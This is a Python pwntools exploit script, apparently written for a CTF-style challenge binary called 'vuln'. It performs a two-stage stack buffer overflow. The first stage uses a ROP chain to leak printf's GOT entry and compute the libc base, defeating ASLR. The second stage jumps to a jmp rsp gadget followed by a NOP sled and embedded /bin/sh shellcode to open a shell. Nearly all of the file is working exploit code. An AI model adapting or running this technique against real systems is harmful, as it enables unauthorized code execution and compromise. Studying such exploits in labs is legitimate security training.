#!/usr/bin/python
from pwn import *
import os

path = os.getcwd()              # Get the current directory

prog_name = 'vuln'              # Filename of vulnerable program
prog = path + '/' + prog_name   # Full path to vulnerable program

libc_name = 'libc-2.27.so'      # Filename of libc
libc = path + '/' + libc_name   # Full path to libc

elf = ELF(prog)
libc_elf = ELF(libc)

rop_elf = ROP(elf)
rop_libc = ROP(libc_elf)

# Shellcode that executes a /bin/sh shell
shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x0f\xaf\xc2\x04\x3b\x0f\x05"

junk = 'A' * 128                        # Random A's to fill up buffer
rbp = 'B' * 8                           # This is used as a marker before ovewriting return address
nop_sled = '\x90' * 32                  # Tells cpu to do nothing until shellcode is reached

# 0000000000064e80 <_IO_printf@@GLIBC_2.2.5>:
# 0x0000000000002b1d : jmp rsp
# 0x40063a -> "%s\n"
# 0x0000000000400603 : pop rdi ; ret
# 0x0000000000400601 : pop rsi ; pop r15 ; ret 
# 0x0000000000400537 <+0>:     push   rbp  

pop_rdi = (rop_elf.find_gadget(['pop rdi','ret']))[0]               # Calculates pop rdi gadget address
log.success('pop rdi, ret : 0x%x' % pop_rdi)

pop_rsi = (rop_elf.find_gadget(['pop rsi','pop r15','ret']))[0]     # Calculates pop rsi, pop r15 gadget address
log.success('pop rsi, pop r15, ret : 0x%x' % pop_rsi)

fmt_specifier = next(elf.search('%s\n'))                            # Search the vulnerable program for format specifier
log.success('fmt specifier("%%s\\n") - 0x%x' % fmt_specifier)

loop_to_main = p64(0x400537)                                        # Vulnerable program main() address

# Using pwntools to simplify searching of printf@PLT && printf@GOT
printf_plt = elf.plt['printf']          
printf_got = elf.got['printf']

log.success('printf() PLT -> 0x%x' % printf_plt)
log.success('printf() GOT -> 0x%x' % printf_got)

g_leak = ''
g_leak += p64(pop_rdi)
g_leak += p64(fmt_specifier)            # 1st arg : "%s\n"
g_leak += p64(pop_rsi)
g_leak += p64(printf_got)               # 2nd arg : Address contained inside printf GOT
g_leak += '\x90' * 8                    # Junk value
g_leak += p64(printf_plt)               # Call printf()
g_leak += loop_to_main                  # After leaking address, loop back to main program

bof = ''
bof += junk
bof += rbp
bof += g_leak                           # Return address

p = process(prog)                       # Executes the vulnerable program

log.warn("1st stage -> Leak")
p.sendline(bof)                         # Sends the payload to the vulnerable program

reply = p.recv()                        # The leaked address will be stored in variable r
reply = reply.strip()                   # Strips newlines
print hexdump(reply)                    # Prints hexdump to console

log.success("Filtered address :")
leak = reply[reply.find("BBBBBBBB") + 0xC : ]
print hexdump(leak)

libc_printf = unpack(leak,48)
log.success("printf() : 0x%x" % libc_printf)

offset_printf = libc_elf.sym['printf']  # Calculates printf offset
libc_base = libc_printf - offset_printf # Calculates libc base address

log.success("printf() offset : 0x%x" % offset_printf)   
log.success("libc base : 0x%x" % libc_base)

offset_jmp_rsp = 0x2b1d
jmp_rsp = libc_base + offset_jmp_rsp    # Calculates jmp rsp gadget address
log.success("jmp rsp : 0x%x" % jmp_rsp)

log.warn("2nd stage -> Pop shell")

bof = ""
bof += junk
bof += rbp
bof += p64(jmp_rsp)                     # Return address
bof += nop_sled
bof += shellcode

raw_input(str(p.proc.pid))              # For GDB use
p.sendline(bof)
p.interactive()                         # Passes control back to user
